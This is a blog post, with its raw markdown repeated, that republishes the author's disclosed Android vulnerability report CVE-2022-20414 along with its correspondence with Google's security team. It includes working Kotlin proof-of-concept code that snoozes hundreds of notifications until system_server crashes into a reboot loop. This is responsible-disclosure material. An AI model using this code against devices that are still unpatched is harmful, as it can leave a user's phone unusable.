2022年，一次偶然的机会，我发现了一个会导致Android系统无限重启致使设备完全不可用的高危漏洞，遂提交给了Google。当年11月的AOSP补丁对此进行了修复，本文是我提交漏洞报告的原文，现公开，待整理。具体可以在[Android Security Bulletin—November 2022](https://source.android.com/docs/security/bulletin/2022-11-01)中搜索CVE-2022-20414了解更多。\n\n### Report description\n\n> In a few words describe your bug. This will help you search for it later.\n\nThe \"snoozeNotification\" method of NotificationListenerService causes Android system to crash and cyclic reboot.\n\n### Bug location\n\n#### Which product or website have you found a vulnerability in?\n\nAndroid\n\n### The problem\n\n#### Please describe the technical details of the vulnerability\n\nStarting from Android 10, there is a change about `AlarmManagerService` and we can check the commit in AOSP: [Adding a per-uid cap on concurrent alarms](https://cs.android.com/android/_/android/platform/frameworks/base/+/0e49b64f40779d6702d10078958031fa540b6138). A Google engineer added a piece of code to `AlarmManagerService`:\n\n```java\nvoid setImpl(...) {\n    ...\n    synchronized (mLock) {\n        ...\n        if (mAlarmsPerUid.get(callingUid, 0) >= mConstants.MAX_ALARMS_PER_UID) {\n            final String errorMsg =\n                \"Maximum limit of concurrent alarms \" + mConstants.MAX_ALARMS_PER_UID\n                + \" reached for uid: \" + UserHandle.formatUid(callingUid)\n                + \", callingPackage: \" + callingPackage;\n            // STOPSHIP (b/128866264): Just to catch breakages. Remove before final release.\n            Slog.wtf(TAG, errorMsg);\n            throw new UnsupportedOperationException(errorMsg);\n        }\n        ...\n    }\n    ...\n}\n```\n\nFor any package, if the current number of alarms exceeds 500, an `UnsupportedOperationException` will be thrown and cause the process to crash, **even if it is a system process.**\n\nIn general, we do not have permission to set alarm for Android system processes. But let's take a look at another piece of code that can be implemented by any third-party application:\n\n```kotlin\nclass TestCrashService : NotificationListenerService() {\n    private val random = Random(System.currentTimeMillis())\n\n    override fun onNotificationPosted(sbn: StatusBarNotification?) {\n        /**\n         * Snooze any notification here with a random duration (fixed duration also works).\n         * The duration better be longer so snoozing can be maintained.\n         */\n        sbn?.let {\n            val duration = TimeUnit.DAYS.toMillis(random.nextLong(30, 365))\n            snoozeNotification(it.key, duration)\n        }\n    }\n}\n```\n\nWe can import `android.service.notification.NotificationListenerService` and implement a subclass. **A pending alarm is set by `AlarmManager` when `snoozeNotification` method is called.**\n\nYou can run `adb shell dumpsys alarm` to find the alarm like this:\n\n```\nRTC_WAKEUP #164: Alarm{6975754 type 0 origWhen 1684207980006 whenElapsed 30672085209 android}\ntag=*walarm*:SnoozeHelper.EVALUATE\ntype=RTC_WAKEUP origWhen=2023-05-16 11:33:00.006 window=0 exactAllowReason=allow-listed repeatInterval=0 count=0 flags=0x9\npolicyWhenElapsed: requester=+354d23h27m52s23ms app_standby=-8m44s929ms device_idle=-- battery_saver=-- power_pending=--\nwhenElapsed=+354d23h27m52s23ms maxWhenElapsed=+354d23h27m52s23ms\noperation=PendingIntent{a03f6fd: PendingIntentRecord{d9f6ff2 android broadcastIntent}}\n```\n\nIf there are so many notifications being snoozing, an equivalent amount of pending alarms will be attached to the **system process** `android`. It's very dangerous because an exception is waiting for you before reaching the maximum limit.\n\n**Finally, the system crashes and is likely to fall into a loop of reboots. That's where the vulnerability lies.**\n\n#### Please briefly explain who can exploit the vulnerability, and what they gain when doing so\n\nI have to say that this is a very serious system vulnerability. For any application that implements `NotificationListenerService`, as long as users **allow notification access**, it may cause Android system processes to crash, further causing the device to get stuck in a reboot loop and become unavailable.\n\nWe can find many apps designed to manage notifications on Play Store. They may use `snoozeNotification` method to delay or eliminate notifications. If notifications are so many and snoozing duration is not short, there will be a risk of causing Android system to crash once the number of pending alarms reaches the limit.\n\n**In other words, someone with bad intentions has way to use this vulnerability to develop malicious applications that can blackmail others.** For the average user, it is difficult to recover from this reboot loop.\n\n#### Upload file\n\n> You can add a file to your report to provide additional information on the vulnerability. Max file size is 50MB.\n\n……\n\n### The cause\n\n#### Please specify the steps to reproduce the issue, including sample code where appropriate. Please be as detailed as possible.\n\nAny application can cause a system crash in just two steps. The sample code has been included in a complete Android Studio project attatched below.\n\nStep 1: Please allow notification access for the app. Then the implementation of `NotificationListenerService` can be running.\n\n```kotlin\nprivate fun startNotificationAccessSetting(context: Context) = try {\n    context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).apply {\n        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)\n    })\n    true\n} catch (e: ActivityNotFoundException) {\n    try {\n        context.startActivity(Intent().apply {\n            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)\n            component = ComponentName(\n                \"com.android.settings\",\n                \"com.android.settings.Settings\\$NotificationAccessSettingsActivity\"\n            )\n            putExtra(\":settings:show_fragment\", \"NotificationAccessSettings\")\n        })\n        true\n    } catch (e1: Exception) {\n        false\n    }\n}\n```\n\nAnd the subclass is simple like this:\n\n```kotlin\nclass TestCrashService : NotificationListenerService() {\n    private val random = Random(System.currentTimeMillis())\n\n    override fun onNotificationPosted(sbn: StatusBarNotification?) {\n        sbn?.let {\n            val duration = TimeUnit.DAYS.toMillis(random.nextLong(30, 365))\n            snoozeNotification(it.key, duration)\n        }\n    }\n}\n```\n\nStep 2: Post a large number of notifications over 500 (`MAX_ALARMS_PER_UID`).\n\n```kotlin\nprivate fun step2() {\n    val name = \"CrashBySnooze\"\n    val descriptionText = \"For test crash.\"\n    val importance = NotificationManager.IMPORTANCE_LOW\n    val channel = NotificationChannel(\"crash_by_snooze\", name, importance).apply {\n        description = descriptionText\n    }\n    val ntfMgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager\n    ntfMgr.createNotificationChannel(channel)\n\n    val ntfBuilder = NotificationCompat.Builder(applicationContext, \"crash_by_snooze\")\n        .setContentTitle(\"CrashBySnooze\")\n        .setContentText(\"For test crash.\")\n        .setSmallIcon(R.mipmap.ic_launcher)\n        .setPriority(NotificationCompat.PRIORITY_LOW)\n    mainScope.launch(Dispatchers.IO) {\n        val ntfBaseId = Random(System.currentTimeMillis()).nextInt(123456, 654321)\n        for (i in 0..555) {\n            ntfMgr.notify(ntfBaseId + i, ntfBuilder.build())\n        }\n    }\n}\n```\n\nDaily use will not have so many notifications appear at once, but day by day, this is chronic death for your Android device.\n\n#### Specify the build fingerprint from the device used to reproduce the issue. The issue should reproduce on a recent build (within the last 30 days).\n\n> run adb shell getprop ro.build.fingerprint and adb shell cat /proc/version for kernel vulnerabilities\n\nAll devices based on Android 10+ (i.e. 10~13) have this vulnerability.\n\n#### Provide a Proof of Concept, complete Android Studio project, source code including an Android.bp file, or similar artifacts.\n\n> You can also include a malformed media file, or a video walkthrough for UX issues.\n\n……\n\n#### Provide crash artifacts including stack trace (if available).\n\nThe crash can cause system zyote to die:\n\n```\n2022-05-27 16:35:11.453 1451-1451/system_process W/AlarmManager: Maximum limit of concurrent alarms 500 reached for uid: 1000, callingPackage: android\n2022-05-27 16:35:11.453 1451-1451/system_process E/Zygote: System zygote died with fatal exception\n    java.lang.IllegalStateException: Maximum limit of concurrent alarms 500 reached for uid: 1000, callingPackage: android\n        at com.android.server.alarm.AlarmManagerService.setImpl(AlarmManagerService.java:2087)\n        at com.android.server.alarm.AlarmManagerService$5.set(AlarmManagerService.java:2630)\n        at android.app.AlarmManager.setImpl(AlarmManager.java:957)\n        at android.app.AlarmManager.setImpl(AlarmManager.java:917)\n        at android.app.AlarmManager.setExactAndAllowWhileIdle(AlarmManager.java:1185)\n        at com.android.server.notification.SnoozeHelper.lambda$scheduleRepostAtTime$2$SnoozeHelper(SnoozeHelper.java:508)\n        at com.android.server.notification.SnoozeHelper$$ExternalSyntheticLambda4.run(Unknown Source:10)\n        at com.android.server.notification.SnoozeHelper.scheduleRepostAtTime(SnoozeHelper.java:513)\n        at com.android.server.notification.SnoozeHelper.scheduleRepost(SnoozeHelper.java:498)\n        at com.android.server.notification.SnoozeHelper.snooze(SnoozeHelper.java:240)\n        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.snoozeNotificationLocked(NotificationManagerService.java:6978)\n        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.snoozeLocked(NotificationManagerService.java:6955)\n        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.run(NotificationManagerService.java:6920)\n        at android.os.Handler.handleCallback(Handler.java:938)\n        at android.os.Handler.dispatchMessage(Handler.java:99)\n        at android.os.Looper.loopOnce(Looper.java:210)\n        at android.os.Looper.loop(Looper.java:299)\n        at com.android.server.SystemServer.run(SystemServer.java:951)\n        at com.android.server.SystemServer.main(SystemServer.java:641)\n        at java.lang.reflect.Method.invoke(Native Method)\n        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:576)\n        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1051)\n2022-05-27 16:35:11.454 1451-1451/system_process E/AndroidRuntime: *** FATAL EXCEPTION IN SYSTEM PROCESS: main\n    java.lang.IllegalStateException: Maximum limit of concurrent alarms 500 reached for uid: 1000, callingPackage: android\n        at com.android.server.alarm.AlarmManagerService.setImpl(AlarmManagerService.java:2087)\n        at com.android.server.alarm.AlarmManagerService$5.set(AlarmManagerService.java:2630)\n        at android.app.AlarmManager.setImpl(AlarmManager.java:957)\n        at android.app.AlarmManager.setImpl(AlarmManager.java:917)\n        at android.app.AlarmManager.setExactAndAllowWhileIdle(AlarmManager.java:1185)\n        at com.android.server.notification.SnoozeHelper.lambda$scheduleRepostAtTime$2$SnoozeHelper(SnoozeHelper.java:508)\n        at com.android.server.notification.SnoozeHelper$$ExternalSyntheticLambda4.run(Unknown Source:10)\n        at com.android.server.notification.SnoozeHelper.scheduleRepostAtTime(SnoozeHelper.java:513)\n        at com.android.server.notification.SnoozeHelper.scheduleRepost(SnoozeHelper.java:498)\n        at com.android.server.notification.SnoozeHelper.snooze(SnoozeHelper.java:240)\n        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.snoozeNotificationLocked(NotificationManagerService.java:6978)\n        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.snoozeLocked(NotificationManagerService.java:6955)\n        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.run(NotificationManagerService.java:6920)\n        at android.os.Handler.handleCallback(Handler.java:938)\n        at android.os.Handler.dispatchMessage(Handler.java:99)\n        at android.os.Looper.loopOnce(Looper.java:210)\n        at android.os.Looper.loop(Looper.java:299)\n        at com.android.server.SystemServer.run(SystemServer.java:951)\n        at com.android.server.SystemServer.main(SystemServer.java:641)\n        at java.lang.reflect.Method.invoke(Native Method)\n        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:576)\n        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1051)\n```\n\n#### HWASan output (if available)\n\n……\n\n#### Does anyone else know about this vulnerability?\n\n- No, this vulnerability is private\n- Yes, this vulnerability is public or known to third parties\n\n#### How would you like to be publicly acknowledged for your report?\n\n> If your report is successful we will acknowledge you using this information in the next release.\n\nIt's my pleasure.\n\n------\n\n### What to expect\n\n1. You will receive an email confirming we have received your report\n2. The report will be sorted and added to the queue of reports\n3. A member of the team will review your report and determine if it is a valid\n4. During this stage it is common for us to contact you with questions about your report\n5. The report is then triaged and the details of the bug are supplied to the relevant team\n6. Depending on the bug we may take between 7 and 14 days to determine the bug’s severity\n7. If successful we will contact you to inform you of your reward\n\n------\n\n### Comments\n\n> ysy950803@gmail.com\n\nI have some suggestions as solutions:\n\n1. Hide the `snoozeNotification` method for app developers.\n2. Alarms cannot be set for system processes by non-system processes.\n3. Don't throw an exception for system processes when reaching the maximum limit of alarms, then we can delete the alarm with the longest duration before set a new alarm.\n\n> ja...@google.com\n\nAssigned to as...@google.com.\nThank you for submitting this report. We’ve filed an internal report for the Android engineering team to investigate further (specified by the Android ID label). Please follow coordinated disclosure practices, such as keeping this report confidential until we have had time to assess your issue, and if necessary, release an update for Android devices.\n\nPLEASE TAKE THE FOLLOWING ACTIONS NOW, if you have not already:\n1. Sign the Google Contributor License Agreement (1).\n2. In a comment below, let us know how you would like to be acknowledged (2) for discovering this potential vulnerability (including company affiliation, if any).\n3. Provide a PoC that reproduces against a recent Android build (not more than 30 days old).\n\nThe typical lifecycle for a confirmed security vulnerability is as follows:\n1. Initial severity rating assessment (subject to change after review by component owners) (3)\n2. Development of an update\n3. Assignment of CVE\n4. Shared under NDA, as part of coordinated disclosure, to Android partners for remediation\n5. Release in a public Android security bulletin\n6. Android Security Rewards payment (if applicable)\n\nMost of these steps will typically be communicated in the sidebar. Please note that we may not reply to requests for status updates or information, however we will continue our typical assessment and remediation efforts. This issue will be updated with information once the reported issue is publicly fixed, if not prior.\n\n\nThank you,\nAndroid Security Team\n\n(1) Contributor license agreement: https://cla.developers.google.com/clas\n(2) Android Security Acknowledgements: https://source.android.com/security/overview/acknowledgements\n(3) Android severity guidelines: https://source.android.com/security/overview/updates-resources.html\n\n> ysy950803@gmail.com\n\nThank you for your reply. ACTIONS DONE:\n\n1. I have signed the CLA for only myself.\n2. If my work can help improve AOSP, it's an honor for me to be acknowledged. I want my information to be displayed like this: Sylvester Yao (姚圣禹, [blog.ysy950803.top](https://blog.ysy950803.top/))\n3. The PoC is an Android Studio Project including source code and APK. Please download the attachment.\n\n> ja...@google.com\n\nHello,\n\nThank you for the additional information as well as your acknowledgement. We will be following our standard investigation and remediation process with this report and ask for your continued confidentiality while we work on this issue.\n\nThank you,\nAndroid Security Team\n\n> ej...@google.com\n\nHello,\n\nThe Android security team has conducted an initial severity assessment on this report. Based on our published severity assessment matrix (1) it was rated as High severity. This issue has been assigned to the appropriate team for remediation, and we’re targeting a fix for release in an upcoming Android Security Bulletin. We will provide an update on remediation status as it becomes available. We ask for your continued confidentiality as we proceed with our standard investigation and remediation process.\n\nThank you,\nAndroid Security Team\n(1) Severity Matrix: https://source.android.com/security/overview/updates-resources#severity\n\n> ysy950803@gmail.com\n\nThanks for your efforts!\n\nI will continue to follow this issue and support you in any way I can.\n\n> ysy950803@gmail.com\n\nHello! How is the progress?\n\n> ja...@google.com\n\nHello,\n\nThank you for following up! This issue has been fixed and is targeted for release in an upcoming Android Security Bulletin. It will be reviewed for both a CVE and reward eligibility under Android Security Rewards Program rules closer to that time (1). Further details will be provided here when available.\n\nThank you,\nAndroid Security Team\n\n(1) https://www.google.com/about/appsecurity/android-rewards/\n\n> an...@google.com\n\nCongratulations! The rewards committee decided to reward you USD $5,000 for reporting this High severity vulnerability. We are paying for the bug report and proof of concept.\n\nTo collect the reward, if you haven't already, please complete the Android Contributor License Agreement for Individuals, so we can use your test code:\nhttps://cla.developers.google.com/clas\n\nYou will receive an email with details on the next steps to collect the reward.\n\nThank you for your contributions to the safety and security of the Android ecosystem.\n\nBest Regards,\nAndroid Security Team\n\n> ysy950803@gmail.com\n\nThank you for your hard work, I am honored to contribute to the Google ecosystem.\n\n> ja...@google.com\n\nHello,\n\nWe will be releasing a patch for this issue in an upcoming bulletin. It will first be released to partners, then to the public the following month.\n\nIf you haven't already, please complete the Google Contributor License Agreement for Individuals, so we can use your patch and test code (1).\n\nWe'd also like to recognize your contribution on our acknowledgements page (2). The acknowledgement information we have on record is \"Sylvester Yao (姚圣禹, blog.ysy950803.top)\". Please let us know if it has changed.\n\nWe may also make this bug publicly accessible when the fix is submitted to AOSP. Please let us know if you would like to keep the bug private instead.\n\nYour CVE ID is CVE-2022-20414.\n\nThanks,\nAndroid Security Team\n\n(1) https://cla.developers.google.com/clas\n(2) https://source.android.com/security/overview/acknowledgements\n\n> ysy950803@gmail.com\n\nThanks for your work. Where can I see the fix code?\n\n> ja...@google.com\n\nHello,\n\nThis is targeted to be released in the November bulletin. Thank you for your continued engagement with the Android VRP!\n\nBest,\nAndroid Security Team\n","source":"_posts/2023-02-14-Android系统无限重启漏洞.md","raw":"---\nlayout:     post\ntitle:      Android系统无限重启漏洞\nsubtitle:   我为世界做贡献。\ndate:       2023-02-14\nauthor:     YSY\nheader-style: text\ncatalog: true\ntags:\n    - Android\n    - AOSP\n---\n\n> 2022年，一次偶然的机会，我发现了一个会导致Android系统无限重启致使设备完全不可用的高危漏洞，遂提交给了Google。当年11月的AOSP补丁对此进行了修复，本文是我提交漏洞报告的原文，现公开，待整理。具体可以在[Android Security Bulletin—November 2022](https://source.android.com/docs/security/bulletin/2022-11-01)中搜索CVE-2022-20414了解更多。\n\n### Report description\n\n> In a few words describe your bug. This will help you search for it later.\n\nThe \"snoozeNotification\" method of NotificationListenerService causes Android system to crash and cyclic reboot.\n\n### Bug location\n\n#### Which product or website have you found a vulnerability in?\n\nAndroid\n\n### The problem\n\n#### Please describe the technical details of the vulnerability\n\nStarting from Android 10, there is a change about `AlarmManagerService` and we can check the commit in AOSP: [Adding a per-uid cap on concurrent alarms](https://cs.android.com/android/_/android/platform/frameworks/base/+/0e49b64f40779d6702d10078958031fa540b6138). A Google engineer added a piece of code to `AlarmManagerService`:\n\n```java\nvoid setImpl(...) {\n    ...\n    synchronized (mLock) {\n        ...\n        if (mAlarmsPerUid.get(callingUid, 0) >= mConstants.MAX_ALARMS_PER_UID) {\n            final String errorMsg =\n                \"Maximum limit of concurrent alarms \" + mConstants.MAX_ALARMS_PER_UID\n                + \" reached for uid: \" + UserHandle.formatUid(callingUid)\n                + \", callingPackage: \" + callingPackage;\n            // STOPSHIP (b/128866264): Just to catch breakages. Remove before final release.\n            Slog.wtf(TAG, errorMsg);\n            throw new UnsupportedOperationException(errorMsg);\n        }\n        ...\n    }\n    ...\n}\n```\n\nFor any package, if the current number of alarms exceeds 500, an `UnsupportedOperationException` will be thrown and cause the process to crash, **even if it is a system process.**\n\nIn general, we do not have permission to set alarm for Android system processes. But let's take a look at another piece of code that can be implemented by any third-party application:\n\n```kotlin\nclass TestCrashService : NotificationListenerService() {\n    private val random = Random(System.currentTimeMillis())\n\n    override fun onNotificationPosted(sbn: StatusBarNotification?) {\n        /**\n         * Snooze any notification here with a random duration (fixed duration also works).\n         * The duration better be longer so snoozing can be maintained.\n         */\n        sbn?.let {\n            val duration = TimeUnit.DAYS.toMillis(random.nextLong(30, 365))\n            snoozeNotification(it.key, duration)\n        }\n    }\n}\n```\n\nWe can import `android.service.notification.NotificationListenerService` and implement a subclass. **A pending alarm is set by `AlarmManager` when `snoozeNotification` method is called.**\n\nYou can run `adb shell dumpsys alarm` to find the alarm like this:\n\n```\nRTC_WAKEUP #164: Alarm{6975754 type 0 origWhen 1684207980006 whenElapsed 30672085209 android}\ntag=*walarm*:SnoozeHelper.EVALUATE\ntype=RTC_WAKEUP origWhen=2023-05-16 11:33:00.006 window=0 exactAllowReason=allow-listed repeatInterval=0 count=0 flags=0x9\npolicyWhenElapsed: requester=+354d23h27m52s23ms app_standby=-8m44s929ms device_idle=-- battery_saver=-- power_pending=--\nwhenElapsed=+354d23h27m52s23ms maxWhenElapsed=+354d23h27m52s23ms\noperation=PendingIntent{a03f6fd: PendingIntentRecord{d9f6ff2 android broadcastIntent}}\n```\n\nIf there are so many notifications being snoozing, an equivalent amount of pending alarms will be attached to the **system process** `android`. It's very dangerous because an exception is waiting for you before reaching the maximum limit.\n\n**Finally, the system crashes and is likely to fall into a loop of reboots. That's where the vulnerability lies.**\n\n#### Please briefly explain who can exploit the vulnerability, and what they gain when doing so\n\nI have to say that this is a very serious system vulnerability. For any application that implements `NotificationListenerService`, as long as users **allow notification access**, it may cause Android system processes to crash, further causing the device to get stuck in a reboot loop and become unavailable.\n\nWe can find many apps designed to manage notifications on Play Store. They may use `snoozeNotification` method to delay or eliminate notifications. If notifications are so many and snoozing duration is not short, there will be a risk of causing Android system to crash once the number of pending alarms reaches the limit.\n\n**In other words, someone with bad intentions has way to use this vulnerability to develop malicious applications that can blackmail others.** For the average user, it is difficult to recover from this reboot loop.\n\n#### Upload file\n\n> You can add a file to your report to provide additional information on the vulnerability. Max file size is 50MB.\n\n……\n\n### The cause\n\n#### Please specify the steps to reproduce the issue, including sample code where appropriate. Please be as detailed as possible.\n\nAny application can cause a system crash in just two steps. The sample code has been included in a complete Android Studio project attatched below.\n\nStep 1: Please allow notification access for the app. Then the implementation of `NotificationListenerService` can be running.\n\n```kotlin\nprivate fun startNotificationAccessSetting(context: Context) = try {\n    context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).apply {\n        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)\n    })\n    true\n} catch (e: ActivityNotFoundException) {\n    try {\n        context.startActivity(Intent().apply {\n            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)\n            component = ComponentName(\n                \"com.android.settings\",\n                \"com.android.settings.Settings\\$NotificationAccessSettingsActivity\"\n            )\n            putExtra(\":settings:show_fragment\", \"NotificationAccessSettings\")\n        })\n        true\n    } catch (e1: Exception) {\n        false\n    }\n}\n```\n\nAnd the subclass is simple like this:\n\n```kotlin\nclass TestCrashService : NotificationListenerService() {\n    private val random = Random(System.currentTimeMillis())\n\n    override fun onNotificationPosted(sbn: StatusBarNotification?) {\n        sbn?.let {\n            val duration = TimeUnit.DAYS.toMillis(random.nextLong(30, 365))\n            snoozeNotification(it.key, duration)\n        }\n    }\n}\n```\n\nStep 2: Post a large number of notifications over 500 (`MAX_ALARMS_PER_UID`).\n\n```kotlin\nprivate fun step2() {\n    val name = \"CrashBySnooze\"\n    val descriptionText = \"For test crash.\"\n    val importance = NotificationManager.IMPORTANCE_LOW\n    val channel = NotificationChannel(\"crash_by_snooze\", name, importance).apply {\n        description = descriptionText\n    }\n    val ntfMgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager\n    ntfMgr.createNotificationChannel(channel)\n\n    val ntfBuilder = NotificationCompat.Builder(applicationContext, \"crash_by_snooze\")\n        .setContentTitle(\"CrashBySnooze\")\n        .setContentText(\"For test crash.\")\n        .setSmallIcon(R.mipmap.ic_launcher)\n        .setPriority(NotificationCompat.PRIORITY_LOW)\n    mainScope.launch(Dispatchers.IO) {\n        val ntfBaseId = Random(System.currentTimeMillis()).nextInt(123456, 654321)\n        for (i in 0..555) {\n            ntfMgr.notify(ntfBaseId + i, ntfBuilder.build())\n        }\n    }\n}\n```\n\nDaily use will not have so many notifications appear at once, but day by day, this is chronic death for your Android device.\n\n#### Specify the build fingerprint from the device used to reproduce the issue. The issue should reproduce on a recent build (within the last 30 days).\n\n> run adb shell getprop ro.build.fingerprint and adb shell cat /proc/version for kernel vulnerabilities\n\nAll devices based on Android 10+ (i.e. 10~13) have this vulnerability.\n\n#### Provide a Proof of Concept, complete Android Studio project, source code including an Android.bp file, or similar artifacts.\n\n> You can also include a malformed media file, or a video walkthrough for UX issues.\n\n……\n\n#### Provide crash artifacts including stack trace (if available).\n\nThe crash can cause system zyote to die:\n\n```\n2022-05-27 16:35:11.453 1451-1451/system_process W/AlarmManager: Maximum limit of concurrent alarms 500 reached for uid: 1000, callingPackage: android\n2022-05-27 16:35:11.453 1451-1451/system_process E/Zygote: System zygote died with fatal exception\n    java.lang.IllegalStateException: Maximum limit of concurrent alarms 500 reached for uid: 1000, callingPackage: android\n        at com.android.server.alarm.AlarmManagerService.setImpl(AlarmManagerService.java:2087)\n        at com.android.server.alarm.AlarmManagerService$5.set(AlarmManagerService.java:2630)\n        at android.app.AlarmManager.setImpl(AlarmManager.java:957)\n        at android.app.AlarmManager.setImpl(AlarmManager.java:917)\n        at android.app.AlarmManager.setExactAndAllowWhileIdle(AlarmManager.java:1185)\n        at com.android.server.notification.SnoozeHelper.lambda$scheduleRepostAtTime$2$SnoozeHelper(SnoozeHelper.java:508)\n        at com.android.server.notification.SnoozeHelper$$ExternalSyntheticLambda4.run(Unknown Source:10)\n        at com.android.server.notification.SnoozeHelper.scheduleRepostAtTime(SnoozeHelper.java:513)\n        at com.android.server.notification.SnoozeHelper.scheduleRepost(SnoozeHelper.java:498)\n        at com.android.server.notification.SnoozeHelper.snooze(SnoozeHelper.java:240)\n        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.snoozeNotificationLocked(NotificationManagerService.java:6978)\n        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.snoozeLocked(NotificationManagerService.java:6955)\n        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.run(NotificationManagerService.java:6920)\n        at android.os.Handler.handleCallback(Handler.java:938)\n        at android.os.Handler.dispatchMessage(Handler.java:99)\n        at android.os.Looper.loopOnce(Looper.java:210)\n        at android.os.Looper.loop(Looper.java:299)\n        at com.android.server.SystemServer.run(SystemServer.java:951)\n        at com.android.server.SystemServer.main(SystemServer.java:641)\n        at java.lang.reflect.Method.invoke(Native Method)\n        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:576)\n        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1051)\n2022-05-27 16:35:11.454 1451-1451/system_process E/AndroidRuntime: *** FATAL EXCEPTION IN SYSTEM PROCESS: main\n    java.lang.IllegalStateException: Maximum limit of concurrent alarms 500 reached for uid: 1000, callingPackage: android\n        at com.android.server.alarm.AlarmManagerService.setImpl(AlarmManagerService.java:2087)\n        at com.android.server.alarm.AlarmManagerService$5.set(AlarmManagerService.java:2630)\n        at android.app.AlarmManager.setImpl(AlarmManager.java:957)\n        at android.app.AlarmManager.setImpl(AlarmManager.java:917)\n        at android.app.AlarmManager.setExactAndAllowWhileIdle(AlarmManager.java:1185)\n        at com.android.server.notification.SnoozeHelper.lambda$scheduleRepostAtTime$2$SnoozeHelper(SnoozeHelper.java:508)\n        at com.android.server.notification.SnoozeHelper$$ExternalSyntheticLambda4.run(Unknown Source:10)\n        at com.android.server.notification.SnoozeHelper.scheduleRepostAtTime(SnoozeHelper.java:513)\n        at com.android.server.notification.SnoozeHelper.scheduleRepost(SnoozeHelper.java:498)\n        at com.android.server.notification.SnoozeHelper.snooze(SnoozeHelper.java:240)\n        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.snoozeNotificationLocked(NotificationManagerService.java:6978)\n        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.snoozeLocked(NotificationManagerService.java:6955)\n        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.run(NotificationManagerService.java:6920)\n        at android.os.Handler.handleCallback(Handler.java:938)\n        at android.os.Handler.dispatchMessage(Handler.java:99)\n        at android.os.Looper.loopOnce(Looper.java:210)\n        at android.os.Looper.loop(Looper.java:299)\n        at com.android.server.SystemServer.run(SystemServer.java:951)\n        at com.android.server.SystemServer.main(SystemServer.java:641)\n        at java.lang.reflect.Method.invoke(Native Method)\n        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:576)\n        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1051)\n```\n\n#### HWASan output (if available)\n\n……\n\n#### Does anyone else know about this vulnerability?\n\n- No, this vulnerability is private\n- Yes, this vulnerability is public or known to third parties\n\n#### How would you like to be publicly acknowledged for your report?\n\n> If your report is successful we will acknowledge you using this information in the next release.\n\nIt's my pleasure.\n\n------\n\n### What to expect\n\n1. You will receive an email confirming we have received your report\n2. The report will be sorted and added to the queue of reports\n3. A member of the team will review your report and determine if it is a valid\n4. During this stage it is common for us to contact you with questions about your report\n5. The report is then triaged and the details of the bug are supplied to the relevant team\n6. Depending on the bug we may take between 7 and 14 days to determine the bug’s severity\n7. If successful we will contact you to inform you of your reward\n\n------\n\n### Comments\n\n> ysy950803@gmail.com\n\nI have some suggestions as solutions:\n\n1. Hide the `snoozeNotification` method for app developers.\n2. Alarms cannot be set for system processes by non-system processes.\n3. Don't throw an exception for system processes when reaching the maximum limit of alarms, then we can delete the alarm with the longest duration before set a new alarm.\n\n> ja...@google.com\n\nAssigned to as...@google.com.\nThank you for submitting this report. We’ve filed an internal report for the Android engineering team to investigate further (specified by the Android ID label). Please follow coordinated disclosure practices, such as keeping this report confidential until we have had time to assess your issue, and if necessary, release an update for Android devices.\n\nPLEASE TAKE THE FOLLOWING ACTIONS NOW, if you have not already:\n1. Sign the Google Contributor License Agreement (1).\n2. In a comment below, let us know how you would like to be acknowledged (2) for discovering this potential vulnerability (including company affiliation, if any).\n3. Provide a PoC that reproduces against a recent Android build (not more than 30 days old).\n\nThe typical lifecycle for a confirmed security vulnerability is as follows:\n1. Initial severity rating assessment (subject to change after review by component owners) (3)\n2. Development of an update\n3. Assignment of CVE\n4. Shared under NDA, as part of coordinated disclosure, to Android partners for remediation\n5. Release in a public Android security bulletin\n6. Android Security Rewards payment (if applicable)\n\nMost of these steps will typically be communicated in the sidebar. Please note that we may not reply to requests for status updates or information, however we will continue our typical assessment and remediation efforts. This issue will be updated with information once the reported issue is publicly fixed, if not prior.\n\n\nThank you,\nAndroid Security Team\n\n(1) Contributor license agreement: https://cla.developers.google.com/clas\n(2) Android Security Acknowledgements: https://source.android.com/security/overview/acknowledgements\n(3) Android severity guidelines: https://source.android.com/security/overview/updates-resources.html\n\n> ysy950803@gmail.com\n\nThank you for your reply. ACTIONS DONE:\n\n1. I have signed the CLA for only myself.\n2. If my work can help improve AOSP, it's an honor for me to be acknowledged. I want my information to be displayed like this: Sylvester Yao (姚圣禹, [blog.ysy950803.top](https://blog.ysy950803.top/))\n3. The PoC is an Android Studio Project including source code and APK. Please download the attachment.\n\n> ja...@google.com\n\nHello,\n\nThank you for the additional information as well as your acknowledgement. We will be following our standard investigation and remediation process with this report and ask for your continued confidentiality while we work on this issue.\n\nThank you,\nAndroid Security Team\n\n> ej...@google.com\n\nHello,\n\nThe Android security team has conducted an initial severity assessment on this report. Based on our published severity assessment matrix (1) it was rated as High severity. This issue has been assigned to the appropriate team for remediation, and we’re targeting a fix for release in an upcoming Android Security Bulletin. We will provide an update on remediation status as it becomes available. We ask for your continued confidentiality as we proceed with our standard investigation and remediation process.\n\nThank you,\nAndroid Security 